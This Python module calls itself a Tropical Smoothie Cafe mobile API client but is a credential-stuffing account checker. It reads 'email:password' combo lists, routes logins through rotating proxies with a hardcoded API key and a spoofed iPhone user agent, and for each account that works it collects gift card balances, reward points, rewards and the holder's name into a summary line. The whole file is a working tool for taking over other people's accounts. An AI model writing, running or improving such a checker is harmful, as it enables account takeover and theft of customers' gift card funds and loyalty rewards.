"""Tropical Smoothie Cafe mobile API client."""

from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from typing import Any

import requests

from .crypto import aes_encrypt

API_BASE = "https://global.tropicalsmoothiecafeapi.com"
API_KEY = "8bklk8bl1k3sB38D9B3l0enyTSC8c09B30lkq0cafe"
USER_AGENT = "Tropical Smoothie Cafe/6.8.20/3268 (iPhone; iOS 26.6.2; Scale/3.00)"
DEVICE_TOKEN = "0" * 64


@dataclass
class AccountResult:
    email: str
    password: str
    success: bool = False
    message: str = ""
    status_code: int | None = None
    punchh_token: str | None = None
    olo_token: str | None = None
    gift_cards: list[dict[str, Any]] = field(default_factory=list)
    points: int | None = None
    rewards: list[dict[str, Any]] = field(default_factory=list)
    profile: dict[str, Any] | None = None

    @property
    def combo(self) -> str:
        return f"{self.email}:{self.password}"

    @property
    def display_name(self) -> str:
        if not self.profile:
            return ""
        return " ".join(
            x.strip()
            for x in [self.profile.get("first_name", ""), self.profile.get("last_name", "")]
            if x and str(x).strip()
        )

    @property
    def gift_card_balance(self) -> float:
        total = 0.0
        for card in self.gift_cards:
            for key in ("balance", "amount", "available_balance", "card_balance"):
                val = card.get(key)
                if val is not None:
                    try:
                        total += float(val)
                    except (TypeError, ValueError):
                        pass
        return total

    def summary_line(self) -> str:
        parts = [self.combo]
        if self.display_name:
            parts.append(f"Name={self.display_name}")
        parts.append(f"Points={self.points or 0}")
        parts.append(f"GiftCards={len(self.gift_cards)}")
        if self.gift_card_balance:
            parts.append(f"GC_Balance=${self.gift_card_balance:.2f}")
        parts.append(f"Rewards={len(self.rewards)}")
        if self.rewards:
            names = [r.get("name", "?") for r in self.rewards[:3]]
            parts.append("RewardsList=" + "; ".join(names))
        return " | ".join(parts)

    def to_dict(self) -> dict[str, Any]:
        return {
            "email": self.email,
            "password": self.password,
            "combo": self.combo,
            "success": self.success,
            "message": self.message,
            "status_code": self.status_code,
            "points": self.points,
            "gift_cards": self.gift_cards,
            "gift_card_balance": self.gift_card_balance,
            "rewards": self.rewards,
            "profile": self.profile,
            "summary": self.summary_line(),
        }


class TSCClient:
    def __init__(self, device_id: str | None = None, proxy: str | None = None) -> None:
        self.device_id = device_id or str(uuid.uuid4()).upper()
        self.session = requests.Session()
        self.session.headers.update(
            {
                "Accept": "application/json, text/plain, */*",
                "client-type": "ios",
                "device-id": self.device_id,
                "Accept-Language": "en-US,en;q=0.9",
                "x-api-key": API_KEY,
                "Content-Type": "application/json",
                "User-Agent": USER_AGENT,
            }
        )
        if proxy:
            self.session.proxies.update(self._proxy_dict(proxy))

    @staticmethod
    def _proxy_dict(proxy: str) -> dict[str, str]:
        proxy = proxy.strip()
        if not proxy:
            return {}
        if proxy.startswith("http://") or proxy.startswith("https://"):
            url = proxy
        elif "@" in proxy:
            url = f"http://{proxy}"
        else:
            parts = proxy.split(":")
            if len(parts) == 2:
                url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                url = f"http://{proxy}"
        return {"http": url, "https": url}

    def _request(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        auth: dict[str, str] | None = None,
    ) -> dict[str, Any]:
        headers = dict(auth or {})
        resp = self.session.request(
            method,
            f"{API_BASE}{path}",
            json=body,
            headers=headers,
            timeout=30,
        )
        resp.raise_for_status()
        return resp.json()

    def login(self, email: str, password: str) -> dict[str, Any]:
        return self._request(
            "POST",
            "/v1/profile/auth/login",
            {
                "email": email,
                "password": aes_encrypt(password),
                "device_token": DEVICE_TOKEN,
            },
        )

    @staticmethod
    def _auth_headers(email: str, punchh: str, olo: str) -> dict[str, str]:
        return {
            "email-id": email,
            "Authorization": f"Bearer {punchh}, Bearer {olo}",
            "punchh-authorization": f"Bearer {punchh}",
            "olo-authorization": f"Bearer {olo}",
        }


def check_account(email: str, password: str, proxy: str | None = None) -> AccountResult:
    client = TSCClient(proxy=proxy)
    result = AccountResult(email=email, password=password)

    try:
        login_resp = client.login(email, password)
    except requests.HTTPError as exc:
        result.message = f"HTTP {exc.response.status_code}"
        try:
            payload = exc.response.json()
            result.message = payload.get("message", result.message)
            result.status_code = payload.get("statusCode")
        except Exception:
            pass
        return result
    except requests.RequestException as exc:
        result.message = f"Network error: {exc}"
        return result

    result.status_code = login_resp.get("statusCode")
    result.message = login_resp.get("message", "")

    if login_resp.get("status") != "Success":
        return result

    data = login_resp.get("data") or {}
    punchh = ((data.get("access_token") or {}).get("token")) or ""
    olo = data.get("oloToken") or data.get("olo_access_token") or ""

    if not punchh:
        result.message = "Login succeeded but no access token returned"
        return result

    result.success = True
    result.punchh_token = punchh
    result.olo_token = olo or None
    auth = TSCClient._auth_headers(email, punchh, olo)

    try:
        gift_resp = client._request("GET", "/v1/payment/giftcards", auth=auth)
        if gift_resp.get("status") == "Success":
            result.gift_cards = gift_resp.get("data") or []
    except requests.RequestException:
        pass

    try:
        bal_resp = client._request("GET", "/v1/profile/auth/fetch_user_balance", auth=auth)
        if bal_resp.get("status") == "Success":
            bal_data = bal_resp.get("data") or {}
            account_balance = bal_data.get("account_balance") or {}
            result.points = account_balance.get("redeemable_points")
            result.rewards = bal_data.get("rewards") or []
    except requests.RequestException:
        pass

    try:
        profile_resp = client._request("GET", "/v1/profile/auth/user", auth=auth)
        if profile_resp.get("status") == "Success":
            user = (profile_resp.get("data") or {}).get("user") or {}
            result.profile = {
                "first_name": user.get("first_name"),
                "last_name": user.get("last_name"),
                "referral_code": user.get("referral_code"),
            }
    except requests.RequestException:
        pass

    return result


def parse_combo_line(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password
